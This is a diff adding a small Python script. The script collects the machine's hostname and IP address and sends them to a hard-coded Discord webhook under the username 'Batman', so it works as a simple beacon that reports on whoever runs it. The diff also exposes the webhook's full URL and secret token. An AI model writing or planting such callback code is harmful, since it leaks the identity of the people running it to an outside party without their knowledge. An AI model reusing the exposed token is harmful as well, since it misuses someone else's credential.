@@ -1,0 +1,12 @@
+import socket
+host_name = socket.gethostname()
+ip_address = socket.gethostbyname(host_name)
+print("Host name: ", host_name)
+print("IP Address: ", ip_address)
+
+from discord_webhook import DiscordWebhook, DiscordEmbed
+content = "Placeholder Message"
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1241084473219747970/QTyPnHcu6wnz-GEl70mQ0tP0E54rutXX6B01gDcGaFj3KwvX-JcgD6NFW3EeFsr4U-wp", username="Batman", content=content)
+embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color = 123123)
+webhook.add_embed(embed)
+response = webhook.execute()
